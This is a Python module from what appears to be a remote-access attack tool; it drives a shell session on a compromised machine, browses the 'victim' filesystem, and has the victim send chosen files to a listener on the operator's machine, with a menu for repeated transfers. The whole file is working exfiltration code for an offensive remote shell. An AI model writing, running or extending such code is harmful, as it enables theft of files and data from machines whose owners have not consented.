import sys
import os
import time
import socket

from transfer.browser import browse_victim, sock_drain
from ui.menu          import arrow_menu
from core.network     import make_server


def do_receive_file(shell_sock, file_port, remote_filepath):
    sys.stdout.write(
        f"\r\n  \033[1;36m[*]\033[0m Requesting \033[1;33m{remote_filepath}\033[0m...\r\n"
    )
    sys.stdout.flush()

    try:
        srv = make_server(file_port)
        srv.settimeout(30)

        sock_drain(shell_sock, timeout=0.5)
        time.sleep(0.3)

        shell_sock.sendall(f"send \"{remote_filepath}\"\n".encode())

        sys.stdout.write(f"  \033[1;36m[*]\033[0m Waiting on port {file_port}...\r\n")
        sys.stdout.flush()

        conn, _ = srv.accept()
        srv.close()

        save_name = os.path.basename(remote_filepath.rstrip('/'))
        save_path = os.path.join(os.getcwd(), save_name)
        total = 0
        with open(save_path, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                f.write(data)
                total += len(data)
        conn.close()

        sock_drain(shell_sock, timeout=0.5)

        sys.stdout.write(f"\r\n  \033[1;32m[+]\033[0m Transfer complete!\r\n")
        sys.stdout.write(f"  \033[1;32m[+]\033[0m Received  : \033[1;33m{total}\033[0m bytes\r\n")
        sys.stdout.write(f"  \033[1;32m[+]\033[0m Saved     : \033[1;33m{save_path}\033[0m\r\n\r\n")
        sys.stdout.flush()
        return True

    except socket.timeout:
        sys.stdout.write(f"\r\n  \033[1;31m[!]\033[0m Timed out (30s)\r\n\r\n")
        sys.stdout.flush()
        return False
    except Exception as e:
        sys.stdout.write(f"\r\n  \033[1;31m[!]\033[0m Error: {e}\r\n\r\n")
        sys.stdout.flush()
        return False


def file_transfer_flow(shell_sock, file_port, fd):
    while True:
        remote_filepath, filename = browse_victim(shell_sock, fd)

        if remote_filepath is None:
            return

        success = do_receive_file(shell_sock, file_port, remote_filepath)

        if success:
            what = arrow_menu(fd, "What next?",
                              ["Send another file", "Back to shell"],
                              color="\033[1;32m")
        else:
            what = arrow_menu(fd, "Transfer failed. What next?",
                              ["Try again", "Back to shell"],
                              color="\033[1;31m")

        if what == 0:
            continue
        else:
            return
